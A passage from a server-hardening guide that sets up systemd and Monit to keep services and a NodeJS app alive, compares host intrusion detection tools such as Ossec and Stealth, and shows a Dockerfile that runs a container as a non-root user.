1. A unit is a configuration file that describes the properties of the process that you would like to run. There are many examples of these that I can show you, and I will point you in the direction soon. They should have a `[Unit]` directive at a minimum. The syntax of the unit files and the target files were derived from Microsoft Windows `.ini` files. Now I think the idea is that if you want to have a `[Service]` directive within your unit file, then you would append `.service` to the end of your unit file name.
2. A target is a grouping mechanism that allows systemd to start up groups of processes at the same time. This happens at every boot as processes are started at different run levels.

Now in Debian there are two places that systemd looks for unit files... In order from lowest to highest precedence, they are as follows:

1. `/lib/systemd/system/` (prefix with `/usr` dir for archlinux) unit files provided by installed packages. Have a look in here for many existing examples of unit files.
2. `/etc/systemd/system/` unit files created by the system administrator.

As mentioned [above](#vps-countermeasures-lack-of-visibility-proactive-monitoring-sysvinit-upstart-systemd-runit-systemd), systemd should be the first process started on your Linux server. systemd reads the different targets and runs the scripts within the specific targets `target.wants` directory (which just contains a collection of symbolic links to the unit files). For example the target file we will be working with is the `multi-user.target` file (actually we do not touch it, systemctl does that for us (as per the magic commands mentioned above)). Just as systemd has two locations in which it looks for unit files. I think this is probably the same for the target files, although there was not any target files in the system administrator defined unit location, but there were some `target.wants` files there.

**systemd Monit Unit file**

I found a template that Monit had already provided for a unit file in  
`/usr/share/doc/monit/examples/monit.service`. There is also one for Upstart. Copy that to where the system administrator unit files should go, as mentioned above, and make the change so that systemd restarts Monit if it dies for what ever reason. Check the `Restart=` options on the [systemd.service man page](http://www.dsm.fordham.edu/cgi-bin/man-cgi.pl?topic=systemd.service). The following is what my initial unit file looked like:

{title="/etc/systemd/system/monit.service", linenos=off, lang=bash}
    [Unit]
    Description=Pro-active monitoring utility for unix systems
    After=network.target
     
    [Service]
    Type=simple
    ExecStart=/usr/bin/monit -I -c /etc/monit/monitrc
    ExecStop=/usr/bin/monit -c /etc/monit/monitrc quit
    ExecReload=/usr/bin/monit -c /etc/monit/monitrc reload
    Restart=always
     
    [Install]
    WantedBy=multi-user.target

Now, some explanation. Most of this is pretty obvious. The `After=` directive just tells systemd to make sure the `network.target` file has been acted on first and of course `network.target` has `After=network-pre.target` which does not have a lot in it. I am not going to go into this now, as I do not really care too much about it. It works. It means the network interfaces have to be up first. If you want to know how, why, check the [systemd NetworkTarget documentation](https://www.freedesktop.org/wiki/Software/systemd/NetworkTarget/). `Type=simple`. Again check the systemd.service man page.
Now to have systemd control Monit, Monit must not run as a background process (the default). To do this, we can either add the `set init` statement to Monit’s control file or add the `-I` option when running systemd, which is exactly what we have done above. The `WantedBy=` is the target that this specific unit is part of.

Now we need to tell systemd to create the symlinks in the `/etc/systemd/system/multi-user.target.wants` directory and other things. See the [systemctl man page](http://www.dsm.fordham.edu/cgi-bin/man-cgi.pl?topic=systemctl) for more details about what enable actually does if you want them. You will also need to start the unit.

Now what I like to do here is:

{linenos=off, lang=bash}
    systemctl status /etc/systemd/system/monit.service

Then compare this output once we enable the service:

{linenos=off, lang=bash}
    ● monit.service - Pro-active monitoring utility for unix systems
       Loaded: loaded (/etc/systemd/system/monit.service; disabled)
       Active: inactive (dead)

{linenos=off, lang=bash}
    sudo systemctl enable /etc/systemd/system/monit.service

systemd now knows about monit.service

{linenos=off, lang=bash}
    systemctl status /etc/systemd/system/monit.service

Outputs:

{linenos=off, lang=bash}
    ● monit.service - Pro-active monitoring utility for unix systems
       Loaded: loaded (/etc/systemd/system/monit.service; enabled)
       Active: inactive (dead)

Now start the service:

{linenos=off, lang=bash}
    sudo systemctl start monit.service # there's a stop and restart also.

Now you can check the `status` of your Monit service again. This shows terse runtime information about the units or PID you specify (monit.service in our case).

{linenos=off, lang=bash}
    sudo systemctl status monit.service

By default this function will show you 10 lines of output. The number of lines can be controlled with the `--lines=` option:

{linenos=off, lang=bash}
    sudo systemctl --lines=20 status monit.service

Now try `kill`ing the Monit process. At the same time, you can watch the output of Monit in another terminal. [tmux](https://tmux.github.io/) or [screen](https://blog.binarymist.net/2011/11/27/centerim-irssi-alpine-on-screen/#screen) is helpful for this:

{linenos=off, lang=bash}
    sudo tail -f /var/log/monit.log

{linenos=off, lang=bash}
    sudo kill -SIGTERM $(pidof monit)
    # SIGTERM is a safe kill and is the default, so you don't actually need to specify it.
    # Be patient, this may take a minute or two for the Monit process to terminate.

Or you can emulate a nastier termination with `SIGKILL` or even `SEGV` (which may kill monit faster).

Now when you run another `status` command you should see the PID has changed. This is because systemd has restarted Monit.

When you need to make modifications to the unit file, you will need to run the following command after save:

{linenos=off, lang=bash}
    sudo systemctl daemon-reload

When you need to make modifications to the running services configuration file  
`/etc/monit/monitrc` for example, you will need to run the following command after save:

{linenos=off, lang=bash}
    sudo systemctl reload monit.service
    # because systemd is now in control of Monit,
    # rather than the before mentioned: sudo monit reload

##### Keep NodeJS Application Alive {#vps-countermeasures-lack-of-visibility-proactive-monitoring-keep-nodejs-application-alive}

Right, we know systemd is always going to be running. So let's use it to take care of the coarse grained service control. That is keeping your NodeJS service alive.

**Using systemd**

**systemd my-nodejs-app Unit file**

You will need to know where your NodeJS binary is. The following will provide the path:

{linenos=off, lang=bash}
    which NodeJS

Now create a systemd unit file `my-nodejs-app.service`

{title="/etc/systemd/system/my-nodejs-app.service", linenos=off, lang=bash}
    [Unit]
    Description=My amazing NodeJS application
    After=network.target
    
    [Service]
    # systemctl start my-nodejs-app # to start the NodeJS script
    ExecStart=[where nodejs binary lives] [where your app.js/index.js lives]
    # systemctl stop my-nodejs-app # to stop the NodeJS script
    # SIGTERM (15) - Termination signal. This is the default and safest way to kill process.
    # SIGKILL (9) - Kill signal.
        # Use SIGKILL as a last resort to kill process.
        # This will not save data or cleaning kill the process.
    ExecStop=/bin/kill -SIGTERM $MAINPID
    # systemctl reload my-nodejs-app # to perform a zero-downtime restart.
    # SIGHUP (1) - Hangup detected on controlling terminal or death of controlling process.
    # Use SIGHUP to reload configuration files and open/close log files.
    ExecReload=/bin/kill -HUP $MAINPID
    Restart=always
    StandardOutput=syslog
    StandardError=syslog
    SyslogIdentifier=my-nodejs-app
    User=my-nodejs-app
    Group=my-nodejs-app # Not really needed unless it's different,
    # as the default group of the user is chosen without this option.
    # Self documenting though, so I like to have it present.
    Environment=NODE_ENV=production
    
    [Install]
    WantedBy=multi-user.target

Add the system user and group so systemd can actually run your service as the user you have specified.

{linenos=off, lang=bash}
    # The following line is not needed if you adduser like below:
    sudo groupadd --system my-nodejs-app
    # To verify which groups exist:
    getent group
    # This will create a system group with the same name and ID of the user:
    sudo adduser --system --no-create-home --group my-nodejs-app
    groups my-nodejs-app # to verify which groups the new user is in.

Now as we did above, go through the same procedure `enable`ing, `start`ing and verifying your new service.

Make sure you have your directory permissions set-up correctly and you should have a running NodeJS application that when it dies will be restarted automatically by systemd.

Do not forget to backup all your new files and changes in case something happens to your server.

We are done with systemd for now. The following are some useful resources that I have used:

* [`kill`ing processes](http://www.cyberciti.biz/faq/kill-process-in-linux-or-terminate-a-process-in-unix-or-linux-systems/)
* [Unix signals](https://en.wikipedia.org/wiki/Unix_signal)
* [Terse guide](https://wiki.archlinux.org/index.php/systemd) of systemd commands and some other quick start sort of info

**Using Monit**

Now just configure your Monit control file. You can spend a lot of time here tweaking a lot more than just your NodeJS application. There are loads of examples around, and the control file itself has lots of commented out examples also. You will find the following the most helpful:

* [Official Monit Documentation](https://mmonit.com/monit/documentation/monit.html)
* [Monit Man page](http://linux.die.net/man/1/monit)

There are a few things that had me stuck for a white. By default Monit only sends alerts on change (dark cockpit approach), not on every cycle if the condition stays the same, unless when you set-up your:

{linenos=off, lang=bash}
    set alert your-email@your.domain

Append `receive all alerts`, so that it looks like this:

{linenos=off, lang=bash}
    set alert your-email@your.domain receive all alerts

There is quite a few things you just work out as you go. The main part I used to health-check my NodeJS app was:

{title="Sub-section of /etc/monit/monitrc", linenos=off, lang=bash}
    check host your_server with address your_server
       start program = "/bin/systemctl start my-nodejs-app.service"
       stop program = "/bin/systemctl stop my-nodejs-app.service"
       if failed ping then alert
       if failed
          port 80 and
          protocol http and
          status = 200 # The default without status is failure if status code >= 400
          request /testdir with content = "some text on my web page" and
             then restart
       if 5 restarts within 5 cycles then alert

Carry on and add to, or uncomment, and modify the `monitrc` file, with the likes of:

1. CPU and memory usage
2. Load averages
3. File system space on all the mount points
4. Check SSH that it has not been restarted by anything other than Monit (potentially swapping the binary or its config). Of course if an attacker kills Monit or systemd immediately restarts it and we get Monit alert(s). We also get real-time logging hopefully to an [off-site syslog server](#vps-countermeasures-lack-of-visibility-web-server-log-management-initial-set-up). Ideally your off-site syslog server also has alerts set-up on particular log events. On top of that you should also have inactivity alerts set-up so that if your log files are not generating events that you expect, then you also receive alerts. Services like [Dead Man’s Snitch](https://deadmanssnitch.com/) or packages like [Simple Event Correlator](https://simple-evcorr.github.io/) with Cron are good for this. On top of all that, if you have a file integrity checker that resides on another system that your host reveals no details of, and you have got it configured to check all the correct file check-sums, dates, permissions, etc, you are removing a lot of low hanging fruit for someone wanting to compromise your system.
5. Directory permissions, uid, gid and checksums. I believe the tools Monit uses to do these checks are part of Monit.

#### Statistics Graphing: {#vps-countermeasures-lack-of-visibility-statistics-graphing}

This is where collectd and graphite come to the party.

{linenos=off}
        Server1   
       +--------------+
       |              |
    +-<| collectd     |
    |  +--------------+
    |                         Graphing
    v   Server2               Server
    |  +--------------+      +-----------+
    |  |              |      |           |
    +-<| collectd     |      |           |
    |  +--------------+      |           |
    |                        | graphite  |<-+
    v   Server3, etc         +-----------+  |
    |  +--------------+                     |
    |  |              |                     ^
    +-<| collectd     |                     |
    |  +--------------+                     |
    +-------------------->------------------+

This is an excellent set of tools for system instrumentation.  
In the Web Applications chapter we add statsd to the mix to provide application specific statistics.





_Todo_







%% https://www.digitalocean.com/community/tutorials/an-introduction-to-tracking-statistics-with-graphite-statsd-and-collectd

%% graphite
%%  Consists of:
%%     carbon - a daemon that listens for time-series data.
%%     whisper - a simple database library for storing time-series data.
%%     webapp - a (Django) webapp that renders graphs on demand.   
%%  Tools that work with graphite: http://graphite.readthedocs.org/en/latest/tools.html
%%  Useful Graphite posts:
%%     https://kevinmccarthy.org/2013/07/18/10-things-i-learned-deploying-graphite/

%% Configure CollectD to Gather System Metrics for Graphite on Ubuntu: https://www.digitalocean.com/community/tutorials/how-to-configure-collectd-to-gather-system-metrics-for-graphite-on-ubuntu-14-04   
%%   collectd https://collectd.org
%%      Collectd is an agent based system metrics collection tool. An agent is deployed on every host that needs to be monitored.
%%      Can send stats to graphite: https://collectd.org/wiki/index.php/Plugin:Write_Graphite
%%         Other plugins here: https://collectd.org/wiki/index.php/Table_of_Plugins
%%      Plugins for collecting OpenStack metrics: https://github.com/catalyst/collectd-openstack
%%      Nagios, Graphite, Collectd for OpenStack.

%% There is also the RackSpace free Monitoring Agent writen in Lua. Details in NodeUp83_libuv.txt
%% http://www.rackspace.com/cloud/monitoring/features
%% https://luvit.io/blog/iot-relay.html
%% https://www.tomaz.me/2013/11/28/running-luvit-and-rackspace-monitoring-agent-on-raspberry-pi.html

I also looked into the following offerings which cater to providing visibility into many aspects of the applications, services, servers and networks, but none that really address security concerns:

* Raygun (costs money)


#### Host Intrusion Detection Systems (HIDS) {#vps-countermeasures-lack-of-visibility-host-intrusion-detection-systems-hids}
![](images/ThreatTags/PreventionAVERAGE.png)

I recently performed an in-depth evaluation of a couple of great HIDS available. The choice of which candidates to take into the second round came from an initial evaluation of a larger collection of HIDS. First I will briefly discuss the full collection I looked at, as these also have some compelling features and reasons as to why you may want to use them in your own VPSs. I will then discuss the two that I was the most impressed with, and dive into some more details around the winner, why, and how I had it configured and running in my lab.

The best time to install a HIDS is on a fresh installed system before you open the host up to the internet or even your LAN, especially if it is corporate. Of course if you do not have that luxury, there are a bunch of tools that can help you determine if you are already owned. Be sure to run one or more over your target system(s) before your HIDS bench-marks it, otherwise you could be bench-marking an already compromised system.

##### [Tripwire](https://packages.debian.org/stretch/tripwire)

Is a HIDS that stores a good known state of vital system files of your choosing and can be set-up to notify an administrator upon change in the files. Tripwire stores cryptographic hashes (deltas) in a database and compares them with the files it has been configured to monitor changes on. DigitalOcean had a [tutorial](https://www.digitalocean.com/community/tutorials/how-to-use-tripwire-to-detect-server-intrusions-on-an-ubuntu-vps) on setting Tripwire up. Most of what you will find around Tripwire now are the commercial offerings.

##### [RkHunter](https://packages.debian.org/stretch/rkhunter)

Is a similar [offering](http://rkhunter.sourceforge.net/) to Tripwire for POSIX compliant systems. RkHunter scans for rootkits, backdoors, checks on the network interfaces and local exploits by testing for:

* MD5 hash changes
* Files commonly created by root-kits
* Wrong file permissions for binaries
* Suspicious strings in kernel modules
* Hidden files in system directories
* Optionally scan within plain-text and binary files

Version 1.4.2 (24/02/2014) now checks the `ssh`, `sshd` and `telent`, although you should not have telnet installed. This could be useful for mitigating non-root users running a trojanised sshd on a 1025-65535 port. You can run ad-hoc scans, then set them up to be run with cron. Debian Jessie has this release in its repository. Any Debian distro before Jessie is on 1.4.0-1 or earlier.

The latest version you can install for Linux Mint Rosa (17.3) within the repositories is 1.4.0-3 (01/05/2012). Linux Mint Sarah (18) within the repositories is 1.4.2-5

##### [Chkrootkit](https://packages.debian.org/stretch/chkrootkit)

It is a good idea to run a couple of these types of scanners. Hopefully what one misses the other will not. Chkrootkit scans for many system programs, some of which are cron, crontab, date, echo, find, grep, su, ifconfig, init, login, ls, netstat, sshd, top and many more. All the usual targets for attackers to modify. You can specify if you do not want them all scanned. Chkrootkit runs tests such as:

* System binaries for rootkit modification
* If the network interface is in promiscuous mode
* lastlog deletions
* wtmp and utmp deletions (logins, logouts)
* Signs of LKM trojans
* Quick and dirty strings replacement

{#vps-countermeasures-lack-of-visibility-host-intrusion-detection-systems-hids-unhide}
##### [Unhide](http://www.unhide-forensics.info/)

While not strictly a HIDS, Unhide is quite a useful forensics tool for working with your system if you suspect it may have been compromised.

Unhide is a forensic tool to find hidden processes and TCP/UDP ports by rootkits / LKMs or by another hidden technique. Unhide runs on Unix/Linux and Windows Systems. It implements six main techniques.

1. Compare `/proc` vs `/bin/ps` output
2. Compare info gathered from `/bin/ps` with info gathered by walking through the `procfs` (ONLY for unhide-linux version).
3. Compare info gathered from `/bin/ps` with info gathered from `syscalls` (syscall scanning)
4. Full PIDs space occupation (PIDs brute-forcing) (ONLY for unhide-linux version).
5. Compare `/bin/ps` output vs `/proc`, `procfs` walking and `syscall` (ONLY for unhide-linux version). Reverse search, verify that all threads seen by `ps` are also seen in the `kernel`.
6. Quick compare `/proc`, `procfs` walking and `syscall` vs `/bin/ps` output (ONLY for unhide-linux version). This technique is about 20 times faster than tests 1+2+3 but may give more false positives.

Unhide includes two utilities: unhide and unhide-tcp.

unhide-tcp identifies TCP/UDP ports that are listening but are not listed in /bin/netstat through brute forcing of all TCP/UDP ports available.

Can also be used by rkhunter in its daily scans. Unhide was number one in the top 10 toolswatch.org security tools pole

##### Ossec

Is a HIDS that also has some preventative features. This is a pretty comprehensive offering with a lot of great features.

##### [Stealth](https://fbb-git.github.io/stealth/)

The idea of Stealth is to do a similar job as the above file integrity checkers, but to leave almost no sediments on the tested computer (called the client). A potential attacker therefore does not necessarily know that Stealth is in fact checking the integrity of its clients files. Stealth is installed on a different machine (called the controller) and scans over SSH.

The faster you can respond to an attacker modifying system files, the more likely you are to circumvent their attempts. Ossec provides real-time cheacking. Stealth provides agent-less (runs from another machine) checking, using the checksum programme of your choice that it copies to the controller on first run, ideally before it is exposed in your DMZ.

##### Deeper with Ossec {#vps-countermeasures-lack-of-visibility-host-intrusion-detection-systems-hids-deeper-with-ossec}

You can find the source on [github](https://github.com/ossec/ossec-hids)

**Who is Behind Ossec?**

Many developers, contributors, managers, reviewers, translators. Infact the [OSSEC team](https://ossec.github.io/about.html#ossec-team) looks almost as large as the [Stealth user base](https://qa.debian.org/popcon.php?package=stealth), well, that is a slight exaggeration.

**Documentation**

There is Lots of documentation. It is not always the easiest to navigate because you have to understand so much up front. There is lots of buzz on the inter-webs and there are several books.

* The main documentation is on [github](https://ossec.github.io/docs/)
* Similar docs on [readthedocs.io](https://ossec-docs.readthedocs.io/en/latest/)
* Mailing list on [google groups](https://groups.google.com/forum/#!forum/ossec-list)
* Several good looking books
  1. Book one ([Instant OSSEC Host-based Intrusion Detection System](https://www.amazon.com/Instant-Host-based-Intrusion-Detection-System/dp/1782167641/))
  2. Book two ([OSSEC Host-Based Intrusion Detection Guide](https://www.amazon.com/OSSEC-Host-Based-Intrusion-Detection-Guide/dp/159749240X))
  3. Book three ([OSSEC How-To – The Quick And Dirty Way](https://blog.savoirfairelinux.com/en/tutorials/free-ebook-ossec-how-to-the-quick-and-dirty-way/))
* [Commercial Support](https://ossec.github.io/blog/posts/2014-05-12-OSSEC-Commercial-Support-Contracts.markdown.html)
* [FAQ](https://ossec-docs.readthedocs.io/en/latest/faq/index.html)
* [Package meta-data](http://ossec.alienvault.com/repos/apt/debian/dists/jessie/main/binary-amd64/Packages)

**Community / Communication**

IRC channel #ossec on irc.freenode.org Although it is not very active.

**Components**

* [Manager](https://ossec-docs.readthedocs.io/en/latest/manual/ossec-architecture.html#manager-or-server) (sometimes called server): does most of the work monitoring the Agents. It stores the file integrity checking databases, the logs, events and system auditing entries, rules, decoders, major configuration options.
* [Agents](https://ossec-docs.readthedocs.io/en/latest/manual/agent/index.html): small collections of programs installed on the machines we are interested in monitoring. Agents collect information and forward it to the manager for analysis and correlation.

There are quite a few other ancillary components also.

**[Architecture](https://ossec-docs.readthedocs.io/en/latest/manual/ossec-architecture.html)**

You can also go the [agent-less](https://ossec-docs.readthedocs.io/en/latest/manual/agent/agentless-monitoring.html) route which may allow the Manager to perform file integrity checks using [agent-less scripts](http://ossec-docs.readthedocs.org/en/latest/manual/agent/agentless-scripts.html). As with Stealth, you have still got the issue of needing to be root in order to read some of the files.

Agents can be installed on VMware ESX but from what I have read it is quite a bit of work.

**[Features](https://ossec.github.io/docs/manual/non-technical-overview.html?page_id=165) in a nut-shell**

* File integrity checking
* Rootkit detection
* Real-time log file monitoring and analysis (you may already have something else doing this)
* Intrusion Prevention System (IPS) features as well: blocking attacks in real-time
* Alerts can go to a databases MySQL or PostgreSQL or other types of [outputs](https://ossec-docs.readthedocs.io/en/latest/manual/output/index.html)
* There is a PHP web UI that runs on Apache if you would rather look at pretty outputs vs log files.

**What I like**

To me, the ability to scan in real-time off-sets the fact that the agents in most cases have binaries installed. This hinders the attacker from [covering their tracks](#vps-identify-risks-lack-of-visibility).

Can be configured to scan systems in [real](https://ossec-docs.readthedocs.io/en/latest/manual/syscheck/index.html#realtime-options)–[time](https://ossec-docs.readthedocs.io/en/latest/manual/syscheck/index.html#real-time-monitoring) based on [inotify](https://en.wikipedia.org/wiki/Inotify) events.

Backed by a large company Trend Micro.

Options: Install options for starters. You have the options of:

* Agent-less installation as described above
* Local installation: Used to secure and protect a single host
* Agent installation: Used to secure and protect hosts while reporting back to a central OSSEC server
* Server installation: Used to aggregate information

Can install a web UI on the manager, so you need Apache, PHP, MySQL.

If you are going to be checking many machines, OSSEC will scale.

**What I like less**

* Unlike Stealth, The fact that something usually has to be installed on the agents
* The packages are not in the standard repositories. The downloads, PGP keys and directions are here: [https://ossec.github.io/downloads.html](https://ossec.github.io/downloads.html).
* I think Ossec may be doing to much and if you do not like the way it does one thing, you may be stuck with it. Personally I really like the idea of a tool doing one thing, doing it well and providing plenty of configuration options to change the way it does its one thing. This provides huge flexibility and minimises your dependency on a suite of tools and/or libraries
* Information overload. There seems to be a lot to get your head around to get it set-up. There are a lot of install options documented (books, inter-webs, official docs). It takes a bit to workout exactly the best procedure for your environment, in saying that it does have scalability on its side.

##### Deeper with Stealth {#vps-countermeasures-lack-of-visibility-host-intrusion-detection-systems-hids-deeper-with-stealth}

And why it rose to the top.

You can find the source on [github](https://github.com/fbb-git/stealth)

**Who is Behind Stealth?**

Author: Frank B. Brokken. An admirable job for one person. Frank is not a fly-by-nighter though. Stealth was first presented to Congress in 2003. It is still actively maintained and used by a few. It is one of GNU/Linux’s dirty little secrets I think. It is a great idea implemented, makes a tricky job simple and does it in an elegant way.

**[Documentation](https://fbb-git.github.io/stealth/)**

All hosted on github.

* [4.01.05 (2016-05-14)](https://packages.debian.org/stretch/stealth)
  * [man page](https://fbb-git.github.io/stealth/stealthman.html)
  * [user guide](https://fbb-git.github.io/stealth/html/stealth.html)

Once you install Stealth, all the documentation can be found by `sudo updatedb && locate stealth`. I most commonly used: HTML docs `/usr/share/doc/stealth-doc/manual/html/` and `/usr/share/doc/stealth-doc/manual/pdf/stealth.pdf` for easy searching across the HTML docs.

* man page `/usr/share/doc/stealth/stealthman.html`
* Examples: `/usr/share/doc/stealth/examples/`

**Binaries**

Debian Stretch: has [4.01.05-1](https://packages.debian.org/stretch/stealth)

Linux Mint 18 (Sarah) has [4.01.04-1](https://community.linuxmint.com/software/view/stealth)

Last time I installed Stealth I had to either go out of band to get a recent version or go with a much older version. These repositories now have very recent releases though.

**Community / Communication**

There is no community really. I see it as one of the dirty little secretes that I am surprised many diligent sys-admins have not jumped on. The author is happy to answer emails. The author is more focussed on maintaining a solid product than marketing.

**Components**

1. **Monitor** The computer initiating the check.  
  * Needs two kinds of outgoing services:
    1. SSH to reach the clients
    2. Mail transport agent (MTA)(sendmail, postfix)
  * Considerations for the Monitor:
    1. No public access
    2. All inbound services should be denied
    3. Access only via its console
    4. Physically secure location
    5. Sensitive information of the clients are stored on the Monitor
    6. Password-less access to the clients for anyone who gains Monitor root access, unless either:
        * You are happy to enter a pass-phrase when ever your Monitor is booted so that Stealth can use SSH to access the client(s). The Monitor could stay running for years, so this may not pose a problem. I suggest using some low powered computer like a Raspberry Pie as your monitoring device, hooked up to a UPS. Also keep in mind that if you wan to monitor files on Client(s) with root permissions, you will have to SSH in as root (which is why it is recommended that the Monitor not accept any incoming connections, and be in a physically safe location). An alternative to having the Monitor log in as root is to have something like Monit take care of integrity checking the Client files with root permissions and have Stealth monitor the non root files and Monit.
        * [ssh-cron](https://fbb-git.github.io/ssh-cron/) is used  
	  
2. **Client** The computer(s) being monitored. I do not see any reason why a Stealth solution could not be set-up to look after many clients.

**Architecture**

The Monitor stores one to many policy files. Each of which is specific to a single client and contains `USE` directives and commands. Its recommended policy to take copies of the client utilities such as the hashing programme `sha1sum`, `find` and others that are used extensively during the integrity scans and copy them to the Monitor to take bench-mark hashes. Subsequent runs will do the same to compare with the initial hashes stored before the client utilities are trusted.

**Features in a nut-shell**

File integrity tests leaving virtually no sediments on the tested client.

Stealth subscribes to the “dark cockpit” approach. I.E. no mail is sent when no changes are detected. If you have a MTA, Stealth can be configured to send emails on changes it finds.

**What I like**

* Its simplicity. There is one package to install on the Monitor. Nothing to install on the client machines. The Client just needs to have the Monitors SSH public key. You will need a Mail Transfer Agent on your Monitor if you do not already have one. My test machine (Linux Mint) did not have one.
* Rather than just modifying the likes of `sha1sum` on the clients that Stealth uses to perform its integrity checks, Stealth would somehow have to be fooled into thinking that the changed hash of the `sha1sum` it has just copied to the Monitor is the same as the previously recorded hash that it did the same with. If the previously recorded hash is removed or does not match the current hash, then Stealth will fire an alert off.
* It is in the Debian repositories
* The whole idea behind it. Systems being monitored give little appearance that they are being monitored, other than I think the presence of a single SSH login when Stealth first starts in the `auth.log`. This could actually be months ago, as the connection remains active for the life of Stealth. The login could be from a user doing anything on the client. It is very discrete.
* Unpredictability of Stealth runs is offered through Stealth’s `--random-interval` and `--repeat` options. E.g. `--repeat 60 --random-interval 30` results in new Stealth-runs on average every 75 seconds. It can usually take a couple of minutes to check all the important files on a file system, so you would probably want to make the checks several minutes apart from each other.
* Subscribes to the Unix philosophy: “do one thing and do it well”
* Stealth’s author is very approachable and open. After talking with Frank and suggesting some ideas to promote Stealth and its community, Frank started a [discussion list](http://sourceforge.net/p/stealth/discussion/). Now that Stealth is moved to github, issues can be submitted easily. If you use Stealth and have any trouble, Frank is very easy to work with.

**What I like less**

* Lack of visible code reviews and testing. Yes it is in Debian, but so was [OpenSSL](http://heartbleed.com/) and [Bash](https://security-tracker.debian.org/tracker/CVE-2014-6271)
* One man band. Support provided via one person alone via email, although now it is on github, it should be easier if / when the need arises. Comparing with the likes of Ossec which has [quite a few](#vps-countermeasures-lack-of-visibility-host-intrusion-detection-systems-hids-deeper-with-ossec).
* Lack of use cases. I did not see anyone using / abusing it. Although Frank did send me some contacts of other people that are using it, so again, a very helpful author. There is not much in the way of use cases on the interwebs. The documentation had clear signs that it was written and targeted people already familiar with the tool. This is understandable as the author has been working on this project for many years and could possibly be disconnected with what is involved for someone completely new to the project to dive in and start using it. In saying that, that is what I did and after a bit of struggling it worked out well.
* Small user base, revealed by the [debian popcon](https://qa.debian.org/popcon.php?package=stealth).

##### Outcomes

In making all of my considerations, I changed my mind quite a few times on which offerings were most suited to which environments. I think this is actually a good thing, as I think it means my evaluations were based on the real merits of each offering rather than any biases.

The simplicity of Stealth, flatter learning curve and its over-all philosophy is what won me over. Although, I think if you have to monitor many Agents / Clients, then Ossec would be an excellent option, as I think it would scale well.

##### Stealth Up and Running

I installed stealth and stealth-doc via synaptic package manager. Then just did a `locate` for stealth to find the docs and other example files. The following are the files I used for documentation, how I used them and the tab order that made sense to me:

1. The main documentation index: [file:///usr/share/doc/stealth-doc/manual/html/stealth.html](file:///usr/share/doc/stealth-doc/manual/html/stealth.html)
2. Chapter one introduction: [file:///usr/share/doc/stealth-doc/manual/html/stealth01.html](file:///usr/share/doc/stealth-doc/manual/html/stealth01.html)
3. Chapter four to help build up a policy file: [file:///usr/share/doc/stealth-doc/manual/html/stealth04.html](file:///usr/share/doc/stealth-doc/manual/html/stealth04.html)
4. Chapter five for running Stealth and building up the policy file: [file:///usr/share/doc/stealth-doc/manual/html/stealth05.html](file:///usr/share/doc/stealth-doc/manual/html/stealth05.html)
5. Chapter six for running Stealth: [file:///usr/share/doc/stealth-doc/manual/html/stealth06.html](file:///usr/share/doc/stealth-doc/manual/html/stealth06.html)
6. Chapter seven for arguments to pass to Stealth: [file:///usr/share/doc/stealth-doc/manual/html/stealth07.html](file:///usr/share/doc/stealth-doc/manual/html/stealth07.html)
7. Chapter eight for error messages: [file:///usr/share/doc/stealth-doc/manual/html/stealth08.html](file:///usr/share/doc/stealth-doc/manual/html/stealth08.html)
8. The Man page: [file:///usr/share/doc/stealth/stealthman.html](file:///usr/share/doc/stealth/stealthman.html)
9. Policy file examples: [file:///usr/share/doc/stealth/examples/](file:///usr/share/doc/stealth/examples/)
10. Useful scripts to use with Stealth: [file:///usr/share/doc/stealth/scripts/usr/bin/](file:///usr/share/doc/stealth/scripts/usr/bin/)
11. All of the documentation in simple text format (good for searching across chapters for strings): [file:///usr/share/doc/stealth-doc/manual/text/stealth.txt](file:///usr/share/doc/stealth-doc/manual/text/stealth.txt)

The files I would need to copy and modify were:

* `/usr/share/doc/stealth/scripts/usr/bin/stealthcleanup.gz`
* `/usr/share/doc/stealth/scripts/usr/bin/stealthcron.gz`
* `/usr/share/doc/stealth/scripts/usr/bin/stealthmail.gz`

Files I used for reference to build up the policy file:

* `/usr/share/doc/stealth/examples/demo.pol.gz`
* `/usr/share/doc/stealth/examples/localhost.pol.gz`
* `/usr/share/doc/stealth/examples/simple.pol.gz`

As mentioned above, providing you have a working MTA, then Stealth will just do its thing when you run it. The next step is to schedule its runs. This can be also (as mentioned above) with a pseudo random interval.

### Docker

_Todo_

Cisecurity has an [excellent resource](https://benchmarks.cisecurity.org/downloads/show-single/?file=docker12.100) for hardening docker images.


#### Consuming community provided images

_Todo_

#### Doppelganger images

_Todo_

#### The Default User is Root

In order to run containers as a non-root user, the user needs to be added in the (preferably base) image (`Dockerfile`) if it is under your control, and set before any commands you want run as a non-root user. Here is an example of the [NodeGoat](https://github.com/owasp/nodegoat) image:

{title="NodeGoat Dockerfile", linenos=on}
    FROM node:4.4
    
    # Create an environment variable in our image for the non-root user we want to use.
    ENV user nodegoat_docker
    ENV workdir /usr/src/app/
    
    # Home is required for npm install. System account with no ability to login to shell
    RUN useradd --create-home --system --shell /bin/false $user
    
    RUN mkdir --parents $workdir
    WORKDIR $workdir
    COPY package.json $workdir
    
    # chown is required by npm install as a non-root user.
    RUN chown $user:$user --recursive $workdir
    # Then all further actions including running the containers should
    # be done under non-root user, unless root is actually required.
    USER $user
    
    RUN npm install
    COPY . $workdir
    
    # Permissions need to be reapplied, due to how docker applies root to new files.
    USER root
    RUN chown $user:$user --recursive $workdir
    RUN chmod --recursive o-wrx $workdir
    
    RUN ls -liah
    RUN ls ../ -liah
    USER $user

As you can see on line 4 we create our `nodegoat_docker` user.  
On line 8 we add our non-root user to the image with no ability to login.  
On line 15 we change the ownership of the `$workdir` so our non-root user has access to do the things that we normally have permissions to do without root, such as installing npm packages and copying files, as we see on line 20 and 21, but first we need to switch to our non-root user on line 18. On lines 25 and 26 we need to reapply ownership and permissions due to the fact that docker does not `COPY` according to the user you are set to run commands as.

Without reapplying the ownership and permissions of the non-root user as seen above on lines 25 and 26, the container directory listings would look like this:

{title="No reapplication of ownership and permissions", linenos=off}
    Step 12 : RUN ls -liah
     ---> Running in f8692fc32cc7
    total 116K
    13 drwxr-xr-x   9 nodegoat_docker nodegoat_docker 4.0K Sep 13 09:00 .
    12 drwxr-xr-x   7 root            root            4.0K Sep 13 09:00 ..
    65 drwxr-xr-x   8 root            root            4.0K Sep 13 08:59 .git
    53 -rw-r--r--   1 root            root             178 Sep 12 04:22 .gitignore
    69 -rw-r--r--   1 root            root            1.9K Nov 21  2015 .jshintrc
    61 -rw-r--r--   1 root            root              55 Nov 21  2015 .nodemonignore
    58 -rw-r--r--   1 root            root             715 Sep 13 08:59 Dockerfile
    55 -rw-r--r--   1 root            root            6.6K Sep 12 04:16 Gruntfile.js
    60 -rw-r--r--   1 root            root             11K Nov 21  2015 LICENSE
